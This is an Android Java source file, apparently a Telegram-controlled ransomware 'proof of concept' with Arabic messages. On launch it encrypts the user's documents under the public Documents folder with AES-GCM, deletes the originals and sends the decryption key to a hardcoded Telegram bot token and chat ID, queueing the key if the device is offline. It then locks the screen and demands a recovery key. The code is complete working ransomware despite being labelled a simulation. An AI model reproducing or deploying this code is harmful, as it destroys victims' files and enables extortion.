package com.example.sandboxpoc;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.Bundle;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.GeneralSecurityException;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "RansomwarePoC";
    
    private static final String TELEGRAM_BOT_TOKEN = "8299109187:AAHuotRY20t8zCzJuqlbZofZQguPBlXJsMg";
    private static final String TELEGRAM_CHAT_ID = "8111855062";
    
    private static final String[] TARGET_EXTENSIONS = {".txt", ".pdf", ".docx", ".xlsx", ".sql", ".db", ".json"};
    private static final int GCM_TAG_LENGTH = 128;
    private static final long MAX_FILE_SIZE = 25 * 1024 * 1024;

    private EditText keyInput;
    private Button unlockBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        setContentView(R.layout.activity_main);

        keyInput = findViewById(R.id.keyInput);
        unlockBtn = findViewById(R.id.unlockBtn);

        new Thread(new Runnable() {
            @Override
            public void run() {
                runSimulation();
                trySyncPendingKeys();
            }
        }).start();

        unlockBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String enteredKeyStr = keyInput.getText().toString().trim();
                if (!enteredKeyStr.isEmpty()) {
                    try {
                        byte[] keyBytes = Base64.decode(enteredKeyStr, Base64.DEFAULT);
                        if (keyBytes.length != 16) {
                            Toast.makeText(MainActivity.this, "مفتاح فك التشفير غير صالح.", Toast.LENGTH_SHORT).show();
                            return;
                        }
                        SecretKey userKey = new SecretKeySpec(keyBytes, "AES");

                        File targetDir = getResolvedTargetDirectory();
                        int decryptedCount = processFiles(targetDir, userKey, false);
                        
                        if (decryptedCount > 0) {
                            Toast.makeText(MainActivity.this, "تمت استعادة (" + decryptedCount + ") ملف بنجاح.", Toast.LENGTH_LONG).show();
                            finish();
                        } else {
                            Toast.makeText(MainActivity.this, "المفتاح غير صحيح أو لا توجد ملفات صالحة.", Toast.LENGTH_SHORT).show();
                        }
                    } catch (Exception e) {
                        Toast.makeText(MainActivity.this, "خطأ في معالجة المفتاح المدخل.", Toast.LENGTH_SHORT).show();
                    }
                } else {
                    Toast.makeText(MainActivity.this, "الرجاء إدخال مفتاح الاستعادة.", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }

    private File getResolvedTargetDirectory() {
        try {
            File targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            if (targetDir != null && (targetDir.exists() || targetDir.mkdirs())) {
                if (targetDir.canWrite()) {
                    return targetDir;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "تعذر الوصول لمجلد المستندات العام، الاعتماد على المجلد الداخلي.");
        }
        return getFilesDir();
    }

    private void runSimulation() {
        try {
            byte[] rawKeyBytes = new byte[16];
            new SecureRandom().nextBytes(rawKeyBytes);
            SecretKey sessionKey = new SecretKeySpec(rawKeyBytes, "AES");
            String encodedKeyString = Base64.encodeToString(rawKeyBytes, Base64.DEFAULT).trim();

            File localKeyFile = new File(getFilesDir(), "recovery.key");
            try (FileOutputStream fos = new FileOutputStream(localKeyFile)) {
                fos.write(rawKeyBytes);
                fos.getChannel().force(true);
            }

            File targetDir = getResolvedTargetDirectory();
            int encryptedCount = processFiles(targetDir, sessionKey, true);

            if (encryptedCount > 0) {
                String message = "🚨 محاكاة أمنية أندرويد (مسنيور H):\n" +
                                 "• تم تشفير (" + encryptedCount + ") من الملفات (AES-GCM).\n\n" +
                                 "🔑 مفتاح الاستعادة:\n`" + encodedKeyString + "`";
                
                boolean sent = sendTelegramMessage(message);
                if (!sent) {
                    saveKeyToPendingQueue(encodedKeyString, encryptedCount);
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "خطأ في تشغيل المحاكاة: " + e.getMessage());
        }
    }

    private void saveKeyToPendingQueue(String keyString, int count) {
        try {
            File pendingFile = new File(getFilesDir(), "pending_sync.key");
            try (FileOutputStream fos = new FileOutputStream(pendingFile)) {
                String content = count + "|" + keyString;
                fos.write(content.getBytes("UTF-8"));
                fos.getChannel().force(true);
            }
        } catch (Exception e) {
            Log.e(TAG, "فشل حفظ المفتاح في طابور الانتظار: " + e.getMessage());
        }
    }

    private void trySyncPendingKeys() {
        if (!isNetworkAvailable()) return;

        File pendingFile = new File(getFilesDir(), "pending_sync.key");
        if (!pendingFile.exists()) return;

        try {
            StringBuilder sb = new StringBuilder();
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(pendingFile), "UTF-8"))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
            }

            String[] parts = sb.toString().split("\\|");
            if (parts.length == 2) {
                String count = parts[0];
                String keyString = parts[1];

                String message = "🚨 مزامنة معلقة:\n" +
                                 "• تم تشفير (" + count + ") من الملفات.\n\n" +
                                 "🔑 مفتاح الاستعادة:\n`" + keyString + "`";

                if (sendTelegramMessage(message)) {
                    pendingFile.delete();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ أثناء محاولة مزامنة المفاتيح المعلقة: " + e.getMessage());
        }
    }

    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkCapabilities capabilities = cm.getNetworkCapabilities(cm.getActiveNetwork());
                return capabilities != null && (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                              capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                              capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET));
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في فحص الشبكة: " + e.getMessage());
        }
        return false;
    }

    private int processFiles(File dir, SecretKey secretKey, boolean isEncrypt) {
        int count = 0;
        if (dir == null || !dir.exists() || !dir.isDirectory()) return 0;
        
        File[] files = dir.listFiles();
        if (files == null) return 0;

        for (File file : files) {
            if (file.isDirectory()) {
                count += processFiles(file, secretKey, isEncrypt);
            } else {
                String fileName = file.getName();
                if (isEncrypt && isTargetFile(fileName)) {
                    File encryptedFile = new File(file.getAbsolutePath() + ".locked");
                    if (encryptFileBlock(file, encryptedFile, secretKey)) {
                        count++;
                    }
                } else if (!isEncrypt && fileName.endsWith(".locked")) {
                    File decryptedFile = new File(file.getAbsolutePath().substring(0, file.getAbsolutePath().length() - 7));
                    if (decryptFileBlock(file, decryptedFile, secretKey)) {
                        count++;
                    }
                }
            }
        }
        return count;
    }

    private boolean encryptFileBlock(File src, File dest, SecretKey secretKey) {
        if (src == null || !src.exists() || src.length() > MAX_FILE_SIZE) return false;

        File parentDir = dest.getParentFile();
        if (parentDir == null || (!parentDir.exists() && !parentDir.mkdirs())) return false;

        File tempFile = null;
        try {
            byte[] fileBytes = readFileToBytesSafe(src);
            if (fileBytes == null) return false;

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            byte[] iv = cipher.getIV();
            byte[] cipherText = cipher.doFinal(fileBytes);

            tempFile = File.createTempFile("enc_", ".tmp", parentDir);
            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                fos.write(iv);
                fos.write(cipherText);
                fos.flush();
                fos.getChannel().force(true);
            }

            moveFileSafely(tempFile, dest);
            deleteFileWithRetry(src);
            return true;

        } catch (Exception e) {
            Log.e(TAG, "خطأ أثناء التشفير: " + src.getName(), e);
            return false;
        } finally {
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }
    }

    private boolean decryptFileBlock(File src, File dest, SecretKey secretKey) {
        if (src == null || !src.exists() || src.length() < 28 || src.length() > (MAX_FILE_SIZE + 28)) {
            return false;
        }

        File parentDir = dest.getParentFile();
        if (parentDir == null || (!parentDir.exists() && !parentDir.mkdirs())) {
            return false;
        }

        File tempFile = null;
        try {
            byte[] encryptedFileBytes = readFileToBytesSafe(src);
            if (encryptedFileBytes == null || encryptedFileBytes.length < 28) {
                return false;
            }

            byte[] iv = new byte[12];
            System.arraycopy(encryptedFileBytes, 0, iv, 0, 12);

            int cipherTextLen = encryptedFileBytes.length - 12;
            byte[] cipherText = new byte[cipherTextLen];
            System.arraycopy(encryptedFileBytes, 12, cipherText, 0, cipherTextLen);

            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            GCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, spec);

            byte[] decryptedData = cipher.doFinal(cipherText);

            tempFile = File.createTempFile("rec_", ".tmp", parentDir);
            try (FileOutputStream fos = new FileOutputStream(tempFile)) {
                fos.write(decryptedData);
                fos.flush();
                fos.getChannel().force(true);
            }

            moveFileSafely(tempFile, dest);
            deleteFileWithRetry(src);
            return true;

        } catch (GeneralSecurityException e) {
            Log.e(TAG, "فشل مصادقة GCM: " + src.getName());
            return false;
        } catch (Exception e) {
            Log.e(TAG, "خطأ أثناء فك التشفير: " + src.getName(), e);
            return false;
        } finally {
            if (tempFile != null && tempFile.exists()) {
                tempFile.delete();
            }
        }
    }

    private byte[] readFileToBytesSafe(File file) {
        if (file.length() > (MAX_FILE_SIZE + 28)) {
            return null;
        }
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] data = new byte[(int) file.length()];
            int totalRead = 0;
            int read;
            while (totalRead < data.length && (read = fis.read(data, totalRead, data.length - totalRead)) != -1) {
                totalRead += read;
            }
            if (totalRead == data.length) return data;
        } catch (Exception e) {
            Log.e(TAG, "خطأ في قراءة بايتات الملف: " + file.getName(), e);
        }
        return null;
    }

    private void moveFileSafely(File sourceFile, File targetFile) throws java.io.IOException {
        java.nio.file.Path sourcePath = sourceFile.toPath();
        java.nio.file.Path targetPath = targetFile.toPath();
        try {
            java.nio.file.Files.move(sourcePath, targetPath,
                    java.nio.file.StandardCopyOption.REPLACE_EXISTING,
                    java.nio.file.StandardCopyOption.ATOMIC_MOVE);
        } catch (java.nio.file.AtomicMoveNotSupportedException e) {
            java.nio.file.Files.move(sourcePath, targetPath,
                    java.nio.file.StandardCopyOption.REPLACE_EXISTING);
        }
    }

    private boolean deleteFileWithRetry(File file) {
        if (file == null || !file.exists()) return true;
        boolean deleted = file.delete();
        int attempts = 0;
        while (!deleted && attempts < 3 && file.exists()) {
            try {
                Thread.sleep(50);
            } catch (InterruptedException ignored) {}
            deleted = file.delete();
            attempts++;
        }
        return deleted;
    }

    private boolean isTargetFile(String fileName) {
        String lowerName = fileName.toLowerCase();
        for (String ext : TARGET_EXTENSIONS) {
            if (lowerName.endsWith(ext)) return true;
        }
        return false;
    }

    private boolean sendTelegramMessage(String message) {
        if (!isNetworkAvailable()) return false;
        HttpURLConnection conn = null;
        try {
            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID + "&parse_mode=Markdown&text=" + java.net.URLEncoder.encode(message, "UTF-8");
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();
                return response.toString().contains("\"ok\":true");
            }
        } catch (Exception e) {
            Log.e(TAG, "خطأ في إرسال تيليجرام: " + e.getMessage());
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
        return false;
    }

    @Override
    public void onBackPressed() {
        Toast.makeText(this, "النظام مقفل بالكامل بواسطة مسنيور H!", Toast.LENGTH_SHORT).show();
    }
}
